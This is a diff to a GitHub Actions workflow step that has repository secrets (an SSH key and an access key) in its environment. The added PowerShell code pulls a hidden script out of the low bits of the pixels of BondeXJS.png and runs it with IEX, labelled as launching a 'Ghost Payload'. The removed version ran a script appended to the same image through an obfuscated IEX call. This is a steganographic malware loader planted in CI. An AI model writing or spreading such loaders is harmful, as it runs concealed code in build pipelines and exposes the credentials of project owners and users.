@@ -43,26 +43,47 @@ jobs:
           SSH_KEY: ${{ secrets.SSH_KEY }}
           A_KEY: ${{ secrets.ACCESS_KEY }}
         run: |
-          $imgPath = Join-Path $pwd "BondeXJS.png"
+          Add-Type -AssemblyName System.Drawing
           
+          function Extract-Payload {
+              param ([string]$imagePath)
+              $img = [System.Drawing.Bitmap]::FromFile($imagePath)
+              $extractedBytes = New-Object System.Collections.Generic.List[byte]
+              $currentByte = 0
+              $bitIndex = 0
+
+              for ($y = 0; $y -lt $img.Height; $y++) {
+                  for ($x = 0; $x -lt $img.Width; $x++) {
+                      $pixel = $img.GetPixel($x, $y)
+                      $bit = $pixel.R -band 1
+                      $currentByte = $currentByte -bor ($bit -shl $bitIndex)
+                      $bitIndex++
+                      if ($bitIndex -eq 8) {
+                          $extractedBytes.Add($currentByte)
+                          $currentByte = 0
+                          $bitIndex = 0
+                          $textSoFar = [System.Text.Encoding]::ASCII.GetString($extractedBytes.ToArray())
+                          if ($textSoFar.EndsWith("##END##")) {
+                              $img.Dispose()
+                              return $textSoFar.Replace("##END##", "")
+                          }
+                      }
+                  }
+              }
+              $img.Dispose()
+          }
+
+          $imgPath = Join-Path $pwd "BondeXJS.png"
           if (Test-Path $imgPath) {
-              Write-Host "[*] Reading payload from $imgPath..." -ForegroundColor Cyan
-              
-              $content = Get-Content $imgPath -Raw -Encoding utf8
-              $marker = "# ========================================================="
-              $startIndex = $content.IndexOf($marker)
-              if ($startIndex -ge 0) {
-                  $payload = $content.Substring($startIndex)
-                  Write-Host "[+] Payload extracted. Launching Ghost Engine..." -ForegroundColor Green
-                  $e = "I" + "E" + "X"
-                  & $e ($payload)
+              Write-Host "[*] Extracting Ghost Payload from Pixels..." -ForegroundColor Cyan
+              $payload = Extract-Payload -imagePath $imgPath
+              if ($payload) {
+                  Write-Host "[+] Decode Successful. Launching Engine..." -ForegroundColor Green
+                  IEX $payload
               } else {
-                  Write-Host "[-] Error: Marker skrip tidak ditemukan dalam gambar!" -ForegroundColor Red
+                  Write-Host "[-] Error: Payload corrupted or not found." -ForegroundColor Red
                   exit 1
               }
-          } else {
-              Write-Host "[-] Error: File BondeXJS.png tidak ditemukan di root repo." -ForegroundColor Red
-              exit 1
           }
           
       - name: s_05
